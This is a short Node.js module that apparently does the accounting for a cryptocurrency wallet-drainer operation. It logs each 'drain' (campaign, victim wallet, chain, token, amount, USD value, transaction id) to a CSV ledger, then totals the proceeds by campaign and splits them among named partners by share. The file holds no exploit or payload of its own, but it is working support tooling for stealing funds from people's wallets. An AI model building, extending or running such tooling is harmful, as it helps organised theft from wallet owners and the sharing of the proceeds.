'use strict';
const fs   = require('fs');
const CAMP = require('./campaigns');

const LEDGER = 'drains.csv';
const PRICES = {
  USDT: 1, USDC: 1, USDD: 1, TUSD: 1, DAI: 1,
  ETH: 2400, BNB: 735, POL: 0.2, AVAX: 25, SOL: 150, BTC: 65000,
};

function logDrain(camp, wallet, chain, symbol, amount, txid) {
  if (!fs.existsSync(LEDGER)) {
    fs.writeFileSync(LEDGER, 'ts,campaign,wallet,chain,symbol,amount,usd,txid\n');
  }
  const usd = (Number(amount) || 0) * (PRICES[symbol] || 0);
  fs.appendFileSync(LEDGER, [
    new Date().toISOString(), camp.label, wallet, chain,
    symbol, amount, usd.toFixed(4), txid || '',
  ].join(',') + '\n');
}

function stats() {
  if (!fs.existsSync(LEDGER)) return 'nothing logged yet';

  const rows = fs.readFileSync(LEDGER, 'utf8').trim().split('\n').slice(1);
  const per = {};
  for (const r of rows) {
    const p = r.split(',');
    per[p[1]] = (per[p[1]] || 0) + Number(p[6] || 0);
  }

  let out = 'Totals by campaign:\n';
  const owed = {};
  for (const [label, total] of Object.entries(per)) {
    out += `  ${label}: $${total.toFixed(2)}\n`;
    const c = Object.values(CAMP).find(x => x.label === label);
    if (c && c.shares) {
      for (const [person, share] of Object.entries(c.shares)) {
        owed[person] = (owed[person] || 0) + total * share;
      }
    }
  }
  out += '\nSplit:\n';
  for (const [p, v] of Object.entries(owed)) out += `  ${p}: $${v.toFixed(2)}\n`;
  return out;
}

module.exports = { logDrain, stats };
